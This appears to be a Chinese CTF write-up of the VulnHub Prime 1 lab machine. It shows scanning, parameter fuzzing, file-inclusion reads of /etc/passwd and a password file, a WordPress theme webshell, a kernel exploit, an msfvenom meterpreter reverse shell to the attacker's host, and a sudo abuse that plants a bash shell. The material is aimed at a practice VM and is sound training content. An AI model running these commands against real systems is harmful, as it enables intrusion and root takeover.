## 前言

  * 靶机地址：<https://www.vulnhub.com/entry/prime-1,358/>

> This machine is designed for those one who is trying to prepare for OSCP or
> OSCP-Exam.
>
> This is first level of prime series. Some help at every stage is given.
> Machine is lengthy as OSCP and Hackthebox's machines are designed.
>
> So you have a target to get root flag as well as user flag. If stuck on a
> point some help are given at a level of enumeration. If any extra help
> needed
>
> Visit our website <http://hacknpentest.com>and <http://hnpsecurity.com>.
>
> Some extra improvement needed to my VM please contact me on my email- suraj
> at hnpsecurity dot com.

本次靶机涉及到的知识点：

  * Web 信息收集

  * Fuzz 基础使用

  * 文件包含利用

  * Wordpress 主题文件 Getshell

  * Ubuntu 16.04 内核溢出提权

  * Sudo 提权

## 信息收集

首先使用 arp-scan 扫描资产：

    
    
    arp-scan --interface=eth0 192.168.226.0/24

![image-20210519163559249](https://image.3001.net/images/20210519/1621423854_60a4f6eec40bf4bf0e899.png!small)

发现目标主机 192.168.226.132，使用 nmap 做进一步端口扫描：

    
    
    nmap -sC -sV -p- -sT 192.168.226.132

![image-20210519163647062](https://image.3001.net/images/20210519/1621423855_60a4f6efee7aa6ca4f266.png!small)

发现目标机开了 22 和 80 这两个端口，先访问 80 口：

![image-20210519161449387](https://image.3001.net/images/20210519/1621423858_60a4f6f20d70ca3f27dc7.png!small)

就这一张图片。

使用 dirsearch 扫描目录发现存在 wordpress 目录：

    
    
    dirsearch -u http://192.168.226.132/ -e*

![image-20210519163744859](https://image.3001.net/images/20210519/1621423861_60a4f6f54626530d79766.png!small)

![image-20210519163847535](https://image.3001.net/images/20210519/1621423867_60a4f6fb1878052792854.png!small)

一看到 wordpress 就想到先用 wpscan 扫一波。

首先用 wpscan 枚举用户名：

    
    
    wpscan --url http://192.168.226.132/wordpress/ --enumerate u

![image-20210519164224588](https://image.3001.net/images/20210519/1621423867_60a4f6fbcd0385607b539.png!small)

发现一个 victor 用户，接下来就是寻找 victor 用户的密码登录进去写 Webshell 了。

首先尝试爆破，先使用使用`cewl`爬取整个网站上的关键字并生成一个字典：

    
    
    cewl http://192.168.226.132/wordpress/ > wordlists.txt

![image-20210519164415196](https://image.3001.net/images/20210519/1621423869_60a4f6fd0bfcc0f361afe.png!small)

然后使用 wpscan 并配合刚才生成的字典进行爆破：

    
    
    wpscan --url http://192.168.226.132/wordpress/ -U victor -P wordlists.txt

![image-20210519164707999](https://image.3001.net/images/20210519/1621423870_60a4f6fe5d7a5b257418f.png!small)

爆破失败……

![A844F3D3A33CFD317D91C42D86FA61AD](https://image.3001.net/images/20210519/1621423870_60a4f6febd78bb8a7a225.jpg!small)

继续寻找突破口，又换了一个更加强劲的字典扫了波目录：

![image-20210519170243930](https://image.3001.net/images/20210519/1621423871_60a4f6ff23098bc92d7af.png!small)

如上图，发现了一个 secret.txt，看来还是得需要一个强大的字典啊。访问 secret.txt 得到如下：

![image-20210519170341759](https://image.3001.net/images/20210519/1621423872_60a4f700d3926b42626b4.png!small)

让我们查看 location.txt，但是这个 location.txt 并不在当前 Web 目录中，并且提示到了 Fuzz，我想应该是让我们 Fuzz
一下参数，找到文件包含漏洞从而读取目标机上某处的 location.txt。

我们使用 wfuzz 扫描：

    
    
    wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 --hw 12 http://192.168.226.132/index.php?FUZZ=shit

隐藏掉所有响应报文字数为 12 的结果后得到了一个 file 参数：

![image-20210519171358856](https://image.3001.net/images/20210519/1621423873_60a4f7012c572c92cd472.png!small)

直接文件包含利用：

    
    
    /index.php?file=location.txt

![image-20210519171549197](https://image.3001.net/images/20210519/1621423875_60a4f7034c6d701257ea9.png!small)

如上图，成功读取到了 location.txt 的内容，并提示让我们在其他 PHP 文件上使用 secrettier360 参数，应该是 image.php
了，先 Fuzz 一下看看：

    
    
    wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 --hw 500 http://192.168.226.132/image.php?secrettier360=FUZZ

![image-20210519172028359](https://image.3001.net/images/20210519/1621423875_60a4f703929dcb55c78f7.png!small)

发现该参数可以访问 dev，并且使用`?secrettier360=dev`与 直接访问 dev 目录得到的内容是一样的：

![image-20210519172141844](https://image.3001.net/images/20210519/1621423876_60a4f704bf8a30b729220.png!small)

![image-20210519172242913](https://image.3001.net/images/20210519/1621423877_60a4f7051f54f20a0d643.png!small)

所以说这里应该也是一处文件包含漏洞利用点，如下图成功利用并读取了 /etc/passwd：

![image-20210519172516107](https://image.3001.net/images/20210519/1621423877_60a4f70576b8e76afef7c.png!small)

并且在 saket 用户的信息中可以看到，其主目录里面有一个 password.txt，直接读取之：

    
    
    /image.php?secrettier360=/home/saket/password.txt

![image-20210519172733724](https://image.3001.net/images/20210519/1621423879_60a4f70761678b63940ae.png!small)

## 开始攻击

先尝试使用该密码登录 saket 用户的 SSH 失败了，使用 victor 用户登录也失败了。之后又使用改密码登录 victor 用户的
wordpress 后台成功：

![image-20210519173034552](https://image.3001.net/images/20210519/1621423879_60a4f7079bf18d819719b.png!small)

然后就是修改主题里面的 PHP 文件，写入 Webshell：

![image-20210519173543281](https://image.3001.net/images/20210519/1621423881_60a4f70935a12fce332fa.png!small)

蚁剑连接成功：

![image-20210519173851820](https://image.3001.net/images/20210519/1621423882_60a4f70aa205e34321ef9.png!small)

发现 flag 不在根目录（老 CTFer 了……），应该在 /root 目录里面，那么接下来便是提权了。

## 权限提升

### 内核漏洞提权

查看目标机系统版本：

![image-20210519174358405](https://image.3001.net/images/20210519/1621423883_60a4f70bdbca2dc603887.png!small)

使用 searchsploit 搜索 Ubuntu 16.04 存在的漏洞：

![image-20210519174306558](https://image.3001.net/images/20210519/1621423884_60a4f70c4e9951c17d43f.png!small)

发现一个本地权限提升漏洞，使用`-m`参数将利用脚本复制到当前的工作目录：

    
    
    searchsploit -m exploit/linux/local/45010.c

![image-20210519174739200](https://image.3001.net/images/20210519/1621423887_60a4f70f15e7bb860c763.png!small)

使用 gcc 编译成可执行文件：

    
    
    gcc 45010.c -o exp

然后将生成的 exp 上传到目标主机的 /tmp 目录中，赋予可执行权限后运行失败了……应该是当时忘了反弹 Shell 了。然后使用 bash 反弹
shell 失败，用 netcat 反弹shell却发现 -e 参数被阉割了……

无奈的我只能选择用 metasploit 了，如下，生成一个 PHP 的马：

    
    
    msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.226.128 lport=4444 -f raw -o shell.php

将生成的 Webshell 内容重新写入到上面的主题文件里，然后访问即可上线：

![image-20210519175921724](https://image.3001.net/images/20210519/1621423891_60a4f713aff096e359f02.png!small)

然后切换到 Shell 中，并使用 python 模拟一个终端，进入到 /tmp，重新执行 exp：

![image-20210519180217101](https://image.3001.net/images/20210519/1621423893_60a4f715b347d08e4f284.png!small)

如上图所示，成功拿到了 root 权限，然后在 /root 目录里面发现并读取到了 flag：

![image-20210519180340023](https://image.3001.net/images/20210519/1621423896_60a4f718f034f8b248cc7.png!small)

### Sudo 提权

我们在拿到目标机的 Shell 之后，发现当前用户可以执行 sudo，那我们可以考虑一下 sudo 提权。执行`sudo -l`：

![image-20210519180720730](https://image.3001.net/images/20210519/1621423898_60a4f71a9e9fd7eb7e4fb.png!small)

如上图所示，发现当前用户可以不需要输入密码即可以 root 权限执行 /home/saket/enc

但是要执行 /home/saket/enc 的话需要输入密码：

![image-20210519180853792](https://image.3001.net/images/20210519/1621423899_60a4f71b36ba6320f33c4.png!small)

我们在 /opt 目录深处发现了一个备份的密码：

![image-20210519181154058](https://image.3001.net/images/20210519/1621423899_60a4f71bb0c377f2e543e.png!small)

使用该密码可以成功执行 /home/saket/enc：

    
    
    sudo /home/saket/enc

![image-20210519181414933](https://image.3001.net/images/20210519/1621423901_60a4f71d1025d8552c32f.png!small)

执行后在 saket 的主目录中生成了一个 key.txt 文件和一个 enc.txt，这个 enc.txt 是一个 AES 加密的玩意。查看
key.txt：

![image-20210519181533842](https://image.3001.net/images/20210519/1621423901_60a4f71d9157ba9a16414.png!small)

提示我们需要用字符串 "ippsec" 的 MD5 值作为秘钥去解密 enc.txt 这个玩意。我们从网上随便找一个 AES 解密的网站直接解密即可：

![image-20210519182236533](https://image.3001.net/images/20210519/1621423902_60a4f71e13faf19c74b5e.png!small)

如上图所示，得到 saket 用户的真实密码为 "tribute_to_ippsec"。

切换到 saket 用户，再次尝试 sudo 提权：

![image-20210519185642046](https://image.3001.net/images/20210519/1621423902_60a4f71e783ee8b837cb2.png!small)

如上图所示，发现 saket 可以不输入密码即以 root 权限执行 /home/victor/undefeated_victor。执行以下看看：

![image-20210519185748145](https://image.3001.net/images/20210519/1621423903_60a4f71f792f82569fea6.png!small)

发现会报错，提示 /tmp/challenge 没有找到。按照常规思路应该是 /home/victor/undefeated_victor 会去执行
/tmp/challenge，那我们便可以将恶意的命令写入 /tmp/challenge 中，当以 root 权限执行
/home/victor/undefeated_victor 时，便会以 root 权限执行 /tmp/challenge 中的命令。

    
    
    echo IyEvYmluL2Jhc2gKL2Jpbi9iYXNo|base64 -d > /tmp/challenge  
    chmod +x /tmp/challenge

这里直接将 "/bin/bash" 写入 /tmp/challenge 中，如下图所示，执行 /home/victor/undefeated_victor
后成功获得了一个 root 权限的 bash：

![image-20210519190504778](https://image.3001.net/images/20210519/1621423904_60a4f7202b427d49eb771.png!small)

成功提权。

## Ending......

![518539](https://image.3001.net/images/20210519/1621423905_60a4f7218c6b2b6c6c9b3.jpg!small)

